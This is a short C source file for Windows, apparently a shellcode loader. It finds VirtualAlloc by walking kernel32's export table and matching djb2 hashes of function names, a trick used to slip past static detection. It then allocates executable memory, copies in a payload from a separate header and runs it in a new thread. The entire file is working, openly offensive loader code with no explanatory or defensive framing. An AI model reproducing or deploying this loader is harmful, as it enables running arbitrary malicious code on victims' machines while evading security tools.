#include <windows.h>
#include "../common/payload.h"

DWORD djb2(const char* str) {
    DWORD hash = 5381; int c;
    while ((c = *str++)) hash = ((hash << 5) + hash) + c;
    return hash;
}

FARPROC get_api(HMODULE h, DWORD hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)h;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)h + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)h + nt->OptionalHeader.DataDirectory[0].VirtualAddress);
    DWORD *names = (DWORD*)((BYTE*)h + exp->AddressOfNames);
    DWORD *funcs = (DWORD*)((BYTE*)h + exp->AddressOfFunctions);
    WORD *ords = (WORD*)((BYTE*)h + exp->AddressOfNameOrdinals);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = (char*)h + names[i];
        if (djb2(name) == hash) return (FARPROC)((BYTE*)h + funcs[ords[i]]);
    }
    return NULL;
}

int main() {
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    // djb2("VirtualAlloc") == 0x030fc2ed
    FARPROC pVA = get_api(k32, 0x030fc2ed);
    void *exec = ((void*(*)(void*, SIZE_T, DWORD, DWORD))pVA)(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec, payload, payload_len);
    HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
    WaitForSingleObject(th, INFINITE);
    return 0;
}
